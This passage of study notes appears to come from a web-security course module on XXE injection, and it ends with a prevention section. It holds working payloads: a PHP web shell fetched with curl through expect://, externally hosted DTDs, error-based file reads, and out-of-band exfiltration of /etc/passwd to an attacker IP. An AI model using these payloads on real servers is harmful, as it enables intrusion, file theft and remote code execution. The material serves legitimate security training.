| **Reading Source Code — attempt** | Use the same attack to read `index.php`: HTTP POST request to `/submitDetails.php` with XML data → response: HTTP/1.1 200 OK, "Check your email for further instructions." — did not work, as we did not get any content; the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity; if a file contains some of XML's special characters (e.g., `</>/&`), it would break the external entity reference and not be used; furthermore, cannot read any binary data, as it would also not conform to the XML format |
| **Reading Source Code — PHP filter** | PHP provides wrapper filters that allow base64 encoding certain resources including files — the final base64 output should not break the XML format; instead of using `file://` as reference, use PHP's `php://filter/` wrapper with the `convert.base64-encode` encoder and an input resource (e.g., `resource=index.php`): `<!DOCTYPE email [`<br>`  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">`<br>`]>` |
| **Reading Source Code — result** | Send the request → response: HTTP/1.1 200 OK, "Check your email for further instructions." with base64 encoded data present; select the base64 string, click Burp's **Inspector** tab (right pane) → shows the decoded file; this trick only works with PHP web applications (next section discusses a more advanced method for reading source code that works with any web framework) |
| **RCE with XXE — overview** | In addition to reading local files, may be able to gain code execution over the remote server; easiest method: look for SSH keys, or attempt a hash stealing trick in Windows-based web applications by making a call to our server; if these do not work, may still execute commands on PHP-based web applications through the `php://expect` filter, though this requires the PHP `expect` module to be installed and enabled |
| **RCE — expect filter** | If XXE directly prints its output (as shown in this section), we can execute basic commands as `expect://id`, and the page should print the command output; however, if we did not have access to the output or needed to execute a more complicated command (e.g., reverse shell), the XML syntax may break and the command may not execute |
| **RCE — web shell method** | Most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, then interacting with it; write a basic PHP web shell and start a python web server: `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php`<br>`sudo python3 -m http.server 80` |
| **RCE — XML payload** | Use the following XML code to execute a curl command that downloads the web shell into the remote server: `<?xml version="1.0"?>`<br>`<!DOCTYPE email [`<br>`  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">`<br>`]>`<br>`<root>`<br>`<name></name>`<br>`<tel></tel>`<br>`<email>&company;</email>`<br>`<message></message>`<br>`</root>`; note: all spaces replaced with `$IFS` to avoid breaking XML syntax; many other characters like `|`, `>`, and `{` may break the code, so avoid using them |

## Advanced File Disclosure

| **Category** | **Details** |
|---|---|
| **Context** | Not all XXE vulnerabilities are straightforward to exploit; some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values, so we may try to force it through errors |
| **Advanced Exfiltration with CDATA — overview** | In the previous section, PHP filters encoded PHP source files so they would not break the XML format; for other types of web applications, we can utilize another method to extract any kind of data (including binary data) for any web application backend; to output data that does not conform to the XML format, wrap the content of the external file reference with a **CDATA** tag (e.g., `<![CDATA[ FILE_CONTENT ]]>`); the XML parser considers this part raw data, which may contain any type of data, including any special characters |
| **CDATA — initial approach** | Define a begin internal entity with `<![CDATA[`, an end internal entity with `]]>`, and place the external entity file in between: `<!DOCTYPE email [`<br>`  <!ENTITY begin "<![CDATA[">`<br>`  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">`<br>`  <!ENTITY end "]]>">`<br>`  <!ENTITY joined "&begin;&file;&end;">`<br>`]>`; after that, referencing the `&joined;` entity should contain our escaped data — however, this will not work, since XML prevents joining internal and external entities |
| **CDATA — XML Parameter Entities** | To bypass this limitation, utilize **XML Parameter Entities** — a special type of entity that starts with a `%` character and can only be used within the DTD; what's unique is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined: `<!ENTITY joined "%begin;%file;%end;">` |
| **CDATA — host DTD** | Store the above line in a DTD file (e.g., `xxe.dtd`), host it on our machine, and reference it as an external entity on the target: `echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd`<br>`python3 -m http.server 8000` |
| **CDATA — payload** | Reference our external entity (`xxe.dtd`) and print the `&joined;` entity, which should contain the content of `submitDetails.php`: `<!DOCTYPE email [`<br>`  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->`<br>`  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->`<br>`  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->`<br>`  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->`<br>`  %xxe;`<br>`]>`<br>`...`<br>`<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->` |
| **CDATA — result** | After writing `xxe.dtd`, hosting it, and adding the above lines to the HTTP request, we finally get the content of `submitDetails.php` — obtained the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords |
| **CDATA — note** | In some modern web servers, we may not be able to read some files (like `index.php`), as the web server would be preventing a DoS attack caused by file/entity self-reference (XML entity reference loop); this trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks |
| **Error Based XXE — overview** | Another situation: the web application might not write any output, so we cannot control any of the XML input entities to write its content; in such cases, we would be blind to the XML output and would not be able to retrieve the file content using usual methods |
| **Error Based XXE — condition** | If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit; if the web application neither writes XML output nor displays any errors, we would face a completely blind situation (discussed in the next section) |
| **Error Based XXE — identify** | Consider the exercise in `/error` at the end of this section, in which none of the XML input entities is displayed on the screen; no entity we can control to write the file output; first try sending malformed XML data (delete any closing tags, change one so it does not close, e.g., `<roo>` instead of `<root>`, or reference a non-existing entity) → the web application displays an error and also revealed the web server directory, which we can use to read the source code of other files |
| **Error Based XXE — host DTD** | Exploit this flaw to exfiltrate file content using a similar technique; host a DTD file containing: `<!ENTITY % file SYSTEM "file:///etc/hosts">`<br>`<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`; the payload defines the `file` parameter entity and joins it with an entity that does not exist — `%nonExistingEntity;` does not exist, so the web application throws an error saying this entity does not exist, along with our joined `%file;` as part of the error; many other variables can cause an error, like a bad URI or bad characters in the referenced file |
| **Error Based XXE — payload** | Call the external DTD script and reference the error entity: `<!DOCTYPE email [ `<br>`  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">`<br>`  %remote;`<br>`  %error;`<br>`]>` |
| **Error Based XXE — result** | Host the DTD script and send the above payload as XML data (no need to include any other XML data) → get the content of `/etc/hosts` file; this method may also be used to read the source code of files by changing the file name in the DTD script (e.g., `"file:///var/www/html/submitDetails.php"`); however, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it |

## Blind Data Exfiltration

| **Category** | **Details** |
|---|---|
| **Context** | In the previous section, saw a blind XXE vulnerability where no output contained any XML input entities; the web server displayed PHP runtime errors, so we used this flaw to read file content from displayed errors; this section shows how to get file content in a **completely blind** situation — neither output of XML entities nor PHP errors are displayed |
| **OOB Data Exfiltration — overview** | Repeating any methods against the exercise at `/blind` shows none seem to work — no way to have anything printed on the web application response; for such cases, utilize **Out-of-band (OOB) Data Exfiltration**, often used in blind cases with many web attacks (blind SQL injections, blind command injections, blind XSS, blind XXE); previous attacks were already out-of-band since we hosted the DTD file on our machine and made the web application connect to us |
| **OOB — key difference** | Instead of having the web application output our file entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading |
| **OOB — approach** | Use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it; create another external parameter entity and reference it to our IP, placing the file parameter value as part of the URL being requested over HTTP: `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`<br>`<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` |
| **OOB — example** | If the file content was `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`); when the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`; decode the `WFhFX1NBTVBMRV9EQVRB` string to get the file content |
| **OOB — PHP script** | Write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal: `<?php`<br>`if(isset($_GET['content'])){`<br>`    error_log("\n\n" . base64_decode($_GET['content']));`<br>`}`<br>`?>` |

## XXE Prevention

| **Category** | **Details** |
|---|---|
| **Overview** | XXE vulnerabilities mainly occur when an unsafe XML input references an external entity, eventually exploited to read sensitive files and perform other actions; preventing XXE is relatively easier than preventing other web vulnerabilities, as they are caused mainly by outdated XML libraries |
| **Avoiding Outdated Components — overview** | Other input validation web vulnerabilities are usually prevented through secure coding practices (XSS, IDOR, SQLi, OS Injection), but this is not entirely necessary to prevent XXE — XML input is usually not handled manually by web developers but by built-in XML libraries; if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data |
| **Outdated Components — PHP example** | PHP's `libxml_disable_entity_loader` function is deprecated since it allows a developer to enable external entities in an unsafe manner, leading to XXE vulnerabilities; PHP documentation warning: **"This function has been DEPRECATED as of PHP 8.0.0. Relying on this function is highly discouraged."**; common code editors (e.g., VSCode) highlight that this specific function is deprecated and warn against using it |
| **Outdated Components — reference** | Detailed report of all vulnerable XML libraries, with recommendations on updating them and using safe functions, in OWASP's **XXE Prevention Cheat Sheet** |
| **Outdated Components — other components** | In addition to updating XML libraries, update any components that parse XML input, such as API libraries like **SOAP**; any document or file processors that may perform XML parsing, like **SVG image processors** or **PDF document processors**, may also be vulnerable to XXE and should be updated as well |
| **Outdated Components — broader context** | These issues are not exclusive to XML libraries — same applies to all other web components (e.g., outdated Node Modules); in addition to common package managers (e.g., npm), common code editors notify web developers of the use of outdated components and suggest alternatives; using the latest XML libraries and web development components can greatly help reduce various web vulnerabilities, including XXE |
| **Using Safe XML Configurations — overview** | Other than using the latest XML libraries, certain XML configurations for web applications can help reduce the possibility of XXE exploitation |
| **Safe XML Configurations — items** | Disable referencing custom **Document Type Definitions (DTDs)**; disable referencing **External XML Entities**; disable **Parameter Entity processing**; disable support for **XInclude**; prevent **Entity Reference Loops** |
| **Safe XML Configurations — error handling** | Saw Error-based XXE exploitation; always have proper exception handling in web applications and always disable displaying runtime errors in web servers |
| **Safe XML Configurations — value** | Such configurations should be another layer of protection if we miss updating some XML libraries and should also prevent XXE exploitation; however, we may still be using vulnerable libraries in such cases and only applying workarounds against exploitation, which is not ideal |
| **Alternative formats** | With the various issues and vulnerabilities introduced by XML data, many recommend using other formats such as **JSON** or **YAML**; this also includes avoiding API standards that rely on XML (e.g., SOAP) and using JSON-based APIs instead (e.g., REST) |
| **WAFs** | Using Web Application Firewalls (WAFs) is another layer of protection against XXE exploitation; however, never entirely rely on WAFs and leave the back-end vulnerable, as WAFs can always be bypassed |
